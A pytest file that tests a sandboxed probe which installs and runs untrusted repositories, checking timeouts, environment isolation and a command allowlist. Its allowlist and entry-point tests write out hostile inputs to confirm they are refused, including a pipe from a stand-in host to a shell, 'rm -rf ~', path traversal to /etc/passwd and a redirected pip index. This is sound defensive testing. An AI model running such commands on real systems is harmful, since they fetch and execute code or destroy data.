"""The tier probe, against repositories that really execute.

Every repository below is built on disk and really probed: a real virtualenv,
real `pip install`, real pytest, real interpreter startups. That is the point.
The corpus in `test_probe_corpus.py` replays hand-labelled *real* repositories
through a substituted runner and measures the gate logic against them, which is
the only way to have a repository that needs a GPU in a test suite — but a
replay can never catch a runner mutated into a no-op, and a probe that executes
nothing would sail through it with every verdict intact.

So this file owns the claims that are about execution actually happening:
timeouts that really expire, an environment the child really cannot see out of,
and an allowlist that really refuses.

Offline by construction. The `sandbox_venv` fixture in `conftest` is built with
system site packages so that pytest is reachable without a download, and no test
declares a dependency that is not already installed or already invalid.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from polish.probe import (
    ENTRYPOINT,
    FAIL,
    HARNESS,
    IMPORT_SMOKE,
    PASS,
    PIP_INSTALL,
    PYTEST,
    SKIP,
    Budget,
    Command,
    Completed,
    NotAllowed,
    Tier,
    harness,
    probe,
)

#: The fixed prefix every pip command carries, written out rather than imported
#: so that changing it in `_commands` breaks a test rather than a promise.
PIP_ARGUMENTS = ("-m", "pip", "install", "--only-binary", ":all:")

PACKAGE = {
    "mypkg/__init__.py": "",
    "mypkg/core.py": "def add(a, b):\n    return a + b\n",
}

PASSING_SUITE = {
    "tests/test_core.py": (
        "from mypkg.core import add\n\n\ndef test_add():\n    assert add(1, 2) == 3\n"
    )
}


@pytest.fixture
def probe_repo(make_repo, sandbox_venv):
    def _probe(files, *, budget=None):
        return probe(make_repo(files), venv=sandbox_venv, budget=budget)

    return _probe


def gate(verdict, number: int):
    return next(outcome for outcome in verdict.gates if outcome.number == number)


# --- the two promotion sources ------------------------------------------------


def test_a_repo_with_a_passing_suite_reaches_tier_one(probe_repo):
    verdict = probe_repo({**PACKAGE, **PASSING_SUITE})

    assert verdict.ceiling is Tier.ONE
    assert gate(verdict, 2).status == PASS
    assert "1 passing tests" in gate(verdict, 2).detail


def test_a_src_layout_repo_is_addressed_the_way_the_interpreter_would(probe_repo):
    """Import roots are found by walking out of packages, not by guessing.

    A `src/` layout is the case that catches an addressing bug: `src.mypkg.core`
    is not a module any interpreter would accept, and gate 3 demotes on failure
    — so a wrong name pins a healthy repository to Tier 0 for a reason that was
    never about the repository.
    """
    verdict = probe_repo(
        {
            "src/mypkg/__init__.py": "",
            "src/mypkg/core.py": "def add(a, b):\n    return a + b\n",
            **PASSING_SUITE,
        }
    )

    assert verdict.ceiling is Tier.ONE
    assert "2 first-party modules" in gate(verdict, 3).detail
    # The names themselves, not just the count. `src.mypkg.core` also imports —
    # Python 3 makes `src/` an implicit namespace package — so a probe that
    # addressed files by path would pass every other assertion here.
    assert any("import mypkg, mypkg.core" in c for c in verdict.commands)


def test_a_mostly_failing_suite_still_reaches_tier_one(probe_repo):
    """ ">0 passing", not "all passing" — a partly red suite is still real traces."""
    verdict = probe_repo(
        {
            **PACKAGE,
            **PASSING_SUITE,
            "tests/test_broken.py": "def test_broken():\n    assert False\n",
        }
    )

    assert verdict.ceiling is Tier.ONE
    assert "1 passing tests" in gate(verdict, 2).detail


# --- gate 3 is demote-only, one module at a time ------------------------------


def test_clean_imports_do_not_promote_a_repo_with_no_suite(probe_repo):
    """The load-bearing asymmetry (issue #3, SPEC §3.1).

    This repository imports perfectly. Import-time tracing would produce tests
    that pass before and after because they cover nothing that ran, which §3.1
    calls actively corrosive. A probe that promotes here is the exact failure
    acceptance criterion 3 forbids, and it would look like a green suite.
    """
    verdict = probe_repo(PACKAGE)

    assert verdict.ceiling is Tier.ZERO
    assert gate(verdict, 1).status == PASS
    assert gate(verdict, 2).status == FAIL
    assert gate(verdict, 3).status == SKIP
    assert "cannot supply one" in gate(verdict, 3).detail
    assert "no execution source" in verdict.reason


def test_a_module_that_does_not_import_is_demoted_and_its_neighbours_are_not(
    probe_repo,
):
    """Gate 3's real job, at the granularity question #4 settled on (#28).

    The suite passes, so gate 2 sets a Tier 1 ceiling. But one module needs a
    GPU that is not there, and characterizing code that cannot even be imported
    would produce recorded behaviour for the fraction that loads and silence for
    the rest. Before #28 that one module pinned the whole repository — the
    `flask` shape, where eight example apps outvoted 485 passing tests.

    So the demotion is now the module's own, and `mypkg/core.py` — which
    imports, and which the suite really executed — keeps what it earned.
    """
    verdict = probe_repo(
        {**PACKAGE, **PASSING_SUITE, "mypkg/train.py": "import torch\n"}
    )

    assert gate(verdict, 2).status == PASS
    assert gate(verdict, 3).status == FAIL
    assert "mypkg.train" in gate(verdict, 3).detail

    assert verdict.ceiling is Tier.ONE
    assert verdict.tier_of("mypkg/train.py") is Tier.ZERO
    assert verdict.tier_of("mypkg/core.py") is Tier.ONE


def test_a_demotion_names_the_path_and_the_error_that_caused_it(probe_repo):
    """Issue #28's last criterion: the log says which code, which tier, and why.

    A count would answer only the first half. A developer reading this at 3am
    wants to know whether the demoted file is their own package or somebody's
    example app, and `ModuleNotFoundError: torch` is the sentence that says so.
    """
    verdict = probe_repo(
        {**PACKAGE, **PASSING_SUITE, "mypkg/train.py": "import torch\n"}
    )

    (demotion,) = verdict.demoted
    assert demotion.module == "mypkg.train"
    assert demotion.path == "mypkg/train.py"
    assert "torch" in demotion.detail

    log = "\n".join(verdict.summary())
    assert "mypkg/train.py" in log
    assert "1 paths held at tier 0" in log


def test_an_edit_spanning_two_tiers_resolves_to_the_lower_one(probe_repo):
    """Question #4's resolution rule, on the verdict: the *lowest* tier wins.

    Tier 1's payoff transforms are cross-file by nature — dedup, extraction — so
    a change spanning a characterizable file and a demoted one is the case the
    rule exists for, and it has to resolve downward, or the trust claim on the
    commit is false about half its diff.
    """
    verdict = probe_repo(
        {**PACKAGE, **PASSING_SUITE, "mypkg/train.py": "import torch\n"}
    )

    assert verdict.tier_for(["mypkg/core.py"]) is Tier.ONE
    assert verdict.tier_for(["mypkg/core.py", "mypkg/train.py"]) is Tier.ZERO
    # A change that touches nothing has had nothing verified about it. The same
    # answer `Coverage.tier_for` gives, deliberately: #15 composes the two with
    # `min()`, so they must not disagree about the degenerate case.
    assert verdict.tier_for([]) is Tier.ZERO


def test_a_repository_where_nothing_imports_keeps_no_ceiling_to_demote_from(
    probe_repo,
):
    """Per-module demotion must not become a way to hold a ceiling over nothing.

    Every module here fails the smoke, so there is no code the ceiling could
    apply to. Raising it anyway would be a claim about the empty set, and the
    run log would read as a Tier 1 repository — which is the one thing the probe
    exists to prevent.
    """
    verdict = probe_repo(
        {
            "mypkg/__init__.py": "import torch\n",
            "mypkg/core.py": "import torch\n",
            "tests/test_core.py": "def test_true():\n    assert True\n",
        }
    )

    assert gate(verdict, 2).status == PASS
    assert verdict.ceiling is Tier.ZERO
    assert verdict.tier_of("mypkg/core.py") is Tier.ZERO
    assert "no first-party module imports" in verdict.reason


def test_an_unsmoked_path_takes_the_ceiling_rather_than_being_demoted(probe_repo):
    """Gate 3 is demote-only, and that has to hold for absence too.

    `conftest.py` is deliberately never imported by gate 3 — it runs under
    pytest, and importing it again outside pytest invents failures. If a missing
    import result demoted it, gate 3 would have quietly become a promotion gate:
    *only what I saw may be Tier 1*. That is the inversion the whole design is
    shaped against, so absent evidence takes the ceiling here. The floor is
    supplied one layer down, by a coverage table that resolves an unknown symbol
    to Tier 0.
    """
    verdict = probe_repo({**PACKAGE, **PASSING_SUITE, "tests/conftest.py": "\n"})

    assert gate(verdict, 3).status == PASS
    assert verdict.demoted == ()
    assert verdict.tier_of("tests/conftest.py") is Tier.ONE


def test_a_suite_that_cannot_import_its_dependencies_stays_tier_zero(probe_repo):
    """The research-repo shape: a suite exists, and nothing in it can run."""
    verdict = probe_repo(
        {
            **PACKAGE,
            "tests/test_train.py": "import torch\n\n\ndef test_train():\n    pass\n",
        }
    )

    assert verdict.ceiling is Tier.ZERO
    assert gate(verdict, 2).status == FAIL


def test_gate_three_does_not_import_the_files_that_run_on_import(probe_repo):
    """`__main__.py` and `setup.py` *run* a repository rather than define it.

    Importing them is not a smoke test, it is an execution — of a program the
    user never opted into (gate 4 governs that) and of a packaging script. Both
    would explode here, and gate 3 demotes on failure, so a probe that imported
    them would pin every packaged or runnable repository to Tier 0.
    """
    verdict = probe_repo(
        {
            **PACKAGE,
            **PASSING_SUITE,
            "mypkg/__main__.py": "raise SystemExit('__main__ was executed')\n",
            "setup.py": "raise SystemExit('setup.py was executed')\n",
        }
    )

    assert verdict.ceiling is Tier.ONE
    assert gate(verdict, 3).status == PASS
    assert not [c for c in verdict.commands if "__main__" in c or "setup" in c]


# --- gate 1 stops everything --------------------------------------------------


def test_undeclarable_dependencies_pin_tier_zero_before_anything_else_runs(probe_repo):
    verdict = probe_repo(
        {**PACKAGE, **PASSING_SUITE, "requirements.txt": "not!valid\n"}
    )

    assert verdict.ceiling is Tier.ZERO
    assert gate(verdict, 1).status == FAIL
    assert [outcome.status for outcome in verdict.gates[1:]] == [SKIP, SKIP, SKIP]
    # The suite never ran: gate 1 is the gate that keeps a broken sandbox from
    # producing a pass count nobody should believe.
    assert not [command for command in verdict.commands if "pytest" in command]


def test_pip_never_receives_options_out_of_a_requirements_file(probe_repo):
    """A requirements file is repository-authored content that pip reads as flags.

    `--index-url` in one would redirect the install to a host the repository
    chose. The probe parses the file itself and forwards only specifiers, which
    is what lets the allowlist refuse every pip argument beginning with a dash.
    """
    verdict = probe_repo(
        {
            **PACKAGE,
            **PASSING_SUITE,
            "requirements.txt": "--index-url http://evil.example\n-e .\npathspec\n",
        }
    )

    installs = [command for command in verdict.commands if "pip install" in command]
    assert installs and all("evil.example" not in command for command in installs)
    assert all(" -e ." not in command for command in installs)
    assert "pathspec" in installs[0]
    # No source distribution is built, so gate 1's claim to execute no
    # repository code holds for third-party `setup.py` too (ADR 0006).
    assert all("--only-binary :all:" in command for command in installs)


# --- gate 4 is opt-in only ----------------------------------------------------


def test_an_opted_in_entry_point_is_an_execution_source(probe_repo):
    verdict = probe_repo(
        {
            **PACKAGE,
            "mypkg/demo.py": (
                "from mypkg.core import add\n\n"
                'if __name__ == "__main__":\n    print(add(1, 2))\n'
            ),
            "polish.toml": '[probe]\nentrypoint = "mypkg.demo"\n',
        }
    )

    assert verdict.ceiling is Tier.ONE
    assert gate(verdict, 2).status == FAIL
    assert gate(verdict, 4).status == PASS
    assert "an opted-in entry point ran" in verdict.reason


def test_an_entry_point_is_never_run_without_being_asked(probe_repo):
    """A `__main__.py` is not consent (SPEC §3.3).

    Gate 4 is the largest risk surface the probe has. Inferring one from the
    repository would mean an unattended run executing a program the user never
    pointed Polish at, in a sandbox that does not contain the machine.
    """
    verdict = probe_repo({**PACKAGE, "mypkg/__main__.py": "raise SystemExit('ran')\n"})

    assert verdict.ceiling is Tier.ZERO
    assert gate(verdict, 4).status == SKIP
    assert not [command for command in verdict.commands if "__main__" in command]


def test_a_shell_string_entry_point_is_refused(probe_repo):
    verdict = probe_repo(
        {**PACKAGE, "polish.toml": '[probe]\nentrypoint = "rm -rf ~; pytest"\n'}
    )

    assert verdict.ceiling is Tier.ZERO
    assert gate(verdict, 4).status == FAIL
    assert "refused" in gate(verdict, 4).detail
    assert not [command for command in verdict.commands if "rm" in command]


def test_an_entry_point_that_fails_promotes_nothing(probe_repo):
    """It exits 3 when run and imports cleanly, so gate 4 is what judges it.

    The `__main__` guard is doing real work here: a module that raised on import
    would be demoted by gate 3 first, and this test would then pass without gate
    4 ever having had an opinion.
    """
    verdict = probe_repo(
        {
            **PACKAGE,
            "mypkg/demo.py": (
                'import sys\n\nif __name__ == "__main__":\n    sys.exit(3)\n'
            ),
            "polish.toml": '[probe]\nentrypoint = "mypkg.demo"\n',
        }
    )

    assert verdict.ceiling is Tier.ZERO
    assert gate(verdict, 3).status == PASS
    assert gate(verdict, 4).status == FAIL


def test_an_entry_point_cannot_escape_the_repository(probe_repo):
    verdict = probe_repo(
        {**PACKAGE, "polish.toml": '[probe]\nentrypoint = "../../etc/passwd.py"\n'}
    )

    assert verdict.ceiling is Tier.ZERO
    assert gate(verdict, 4).status == FAIL
    assert not [command for command in verdict.commands if "passwd" in command]


# --- everything resolves downward ---------------------------------------------


def test_a_suite_that_never_finishes_resolves_downward(probe_repo):
    """A real timeout, really expiring. SPEC §4.1: the run completes unattended.

    Without this, a repository whose suite waits on a database that is not there
    would hold the night open until morning.
    """
    verdict = probe_repo(
        {
            **PACKAGE,
            "tests/test_slow.py": (
                "import time\n\n\ndef test_slow():\n    time.sleep(60)\n"
            ),
        },
        budget=Budget(suite_seconds=1.0),
    )

    assert verdict.ceiling is Tier.ZERO
    assert gate(verdict, 2).status == FAIL
    assert "did not finish within 1s" in gate(verdict, 2).detail


def test_an_exhausted_budget_resolves_downward(probe_repo):
    """Spent before gate 1's first command, so all four gates report nothing.

    A verdict that quietly omitted the gates it never reached would read as
    though they passed, which for gate 2 is the difference between "no execution
    source" and "a suite ran".
    """
    verdict = probe_repo(
        {**PACKAGE, **PASSING_SUITE, "requirements.txt": "pathspec\n"},
        budget=Budget(total_seconds=0.0),
    )

    assert verdict.ceiling is Tier.ZERO
    assert "budget" in verdict.reason
    assert [outcome.status for outcome in verdict.gates] == [SKIP] * 4
    assert verdict.commands == ()


def test_a_runner_that_only_ever_errors_resolves_downward(make_repo, sandbox_venv):
    """Nothing about a broken world may resolve upward, including Polish itself."""
    verdict = probe(
        make_repo({**PACKAGE, **PASSING_SUITE}),
        venv=sandbox_venv,
        runner=lambda command: Completed(code=1, output="boom"),
    )

    assert verdict.ceiling is Tier.ZERO


def test_a_runner_that_lies_that_everything_worked_cannot_forge_a_pass_count(
    make_repo, sandbox_venv
):
    """Exit 0 is not evidence a suite ran. Gate 2 wants a pass *count*.

    pytest exits 0 when it collects nothing under some configurations, and "the
    command succeeded" would then promote a repository with no tests at all.
    """
    verdict = probe(
        make_repo({**PACKAGE, **PASSING_SUITE}),
        venv=sandbox_venv,
        runner=lambda command: Completed(code=0, output=""),
    )

    assert verdict.ceiling is Tier.ZERO
    assert "no pass count" in gate(verdict, 2).detail


def test_a_suite_that_ran_and_passed_nothing_is_not_an_execution_source(
    make_repo, sandbox_venv
):
    """A parsed count of zero is not the same fact as an unparseable summary.

    Both fail gate 2, but they fail it for different reasons and the log has to
    say which. Driven through a substituted runner because real pytest reports
    "no tests ran" rather than "0 passed", so the guard is otherwise unreachable
    from a real suite — and an unreachable guard is exactly the kind that gets
    deleted as dead code by someone who did not know what it was for.
    """
    verdict = probe(
        make_repo({**PACKAGE, **PASSING_SUITE}),
        venv=sandbox_venv,
        runner=lambda command: Completed(code=0, output="0 passed in 0.01s"),
    )

    assert verdict.ceiling is Tier.ZERO
    assert "0 passing tests" in gate(verdict, 2).detail


# --- containment --------------------------------------------------------------


def test_the_repository_does_not_inherit_the_users_environment(probe_repo, monkeypatch):
    """An untrusted suite must not be able to read the shell's credentials.

    The assertion is made by the probed repository's own test, which is the only
    place that can see the environment the child was actually given. If the
    variable leaks through, that test fails, gate 2 finds zero passing, and the
    verdict drops — so this test fails either way round.
    """
    monkeypatch.setenv("POLISH_PRETEND_API_KEY", "secret")
    verdict = probe_repo(
        {
            **PACKAGE,
            "tests/test_env.py": (
                "import os\n\n\ndef test_no_leak():\n"
                "    assert os.environ.get('POLISH_PRETEND_API_KEY') is None\n"
            ),
        }
    )

    assert verdict.ceiling is Tier.ONE


@pytest.mark.parametrize(
    ("kind", "arguments"),
    [
        # `python -c` is the one shape that takes source rather than a name, so
        # it is the one an attacker would aim at. Nothing in the probe can
        # currently build these — `_discovery` only ever yields valid dotted
        # names — which is exactly why they are asserted here: an unreachable
        # guard with no test is the kind that gets deleted as dead code by
        # someone who did not know what it was for.
        (IMPORT_SMOKE, ("-c", "import os; os.system('curl evil.example | sh')")),
        (IMPORT_SMOKE, ("-c", "__import__('os').system('id')")),
        (IMPORT_SMOKE, ("-c", "import os, sys; sys.exit(1)")),
        (
            PYTEST,
            ("-m", "pytest", "-q", "--tb=no", "-p", "no:cacheprovider", "-p", "evil"),
        ),
        (PIP_INSTALL, (*PIP_ARGUMENTS, "--index-url", "http://evil.example")),
        (ENTRYPOINT, ("-c", "print(1)")),
        (ENTRYPOINT, ("bash", "-c", "id")),
        (ENTRYPOINT, ("/etc/passwd.py",)),
        ("git-clone", ("clone", "http://evil.example")),
        # The fifth shape (ADR 0007). Its whole claim is that the program is a
        # constant in `_commands`, so the interesting refusals are the ones that
        # look almost right: a different program, an extra argument, or the
        # correct program without `-P` — which would put the repository's own
        # directory ahead of Polish's on `sys.path` and let it supply
        # `_polish_harness` itself.
        (HARNESS, ("-P", "-c", "import _polish_harness as _h; _h.evil()")),
        (HARNESS, ("-P", "-c", "import _polish_harness")),
        (HARNESS, ("-P", "-c", "import _polish_harness as _h; _h.suite()", "--x")),
        (HARNESS, ("-c", "import _polish_harness as _h; _h.suite()")),
    ],
)
def test_the_allowlist_refuses_anything_outside_its_five_shapes(kind, arguments):
    """A `Command` cannot exist outside the allowlist, so nothing can dispatch one.

    Validated at construction rather than at dispatch: the dispatch check is the
    one a refactor deletes by accident, and substituting a runner must not be
    able to widen what is legal (ADR 0006).
    """
    with pytest.raises(NotAllowed):
        Command(
            kind=kind, python=Path("/venv/bin/python"), arguments=arguments, timeout=1.0
        )


def test_the_harness_runs_only_the_tasks_polish_wrote(sandbox_venv):
    """The fifth shape carries a Polish constant, and there is no fourth task.

    ADR 0007's argument for admitting the shape at all is that a repository
    cannot influence a single character of it. That argument survives exactly as
    long as the task name is looked up in a table rather than interpolated into
    a string, which is what this pins.
    """
    python = sandbox_venv / "bin" / "python"
    assert harness(python, "suite", 1.0).display() == (
        "python -P -c import _polish_harness as _h; _h.suite()"
    )
    with pytest.raises(NotAllowed):
        harness(python, "suite(); __import__('os').system('id')", 1.0)


def test_every_command_is_the_sandbox_interpreter(make_repo, sandbox_venv):
    """The one rule the allowlist exists to enforce: the repo supplies no program.

    Asserted over a repository built to make the probe reach for all four gates.
    """
    issued = []

    def recording(command):
        issued.append(command)
        return Completed(code=0, output="1 passed in 0.01s")

    probe(
        make_repo(
            {
                **PACKAGE,
                **PASSING_SUITE,
                "requirements.txt": "pathspec\n",
                "polish.toml": '[probe]\nentrypoint = "mypkg.core"\n',
            }
        ),
        venv=sandbox_venv,
        runner=recording,
    )

    assert issued
    for command in issued:
        assert command.argv[0] == str(sandbox_venv / "bin" / "python")
        assert command.kind in {"pip-install", "pytest", "import-smoke", "entrypoint"}
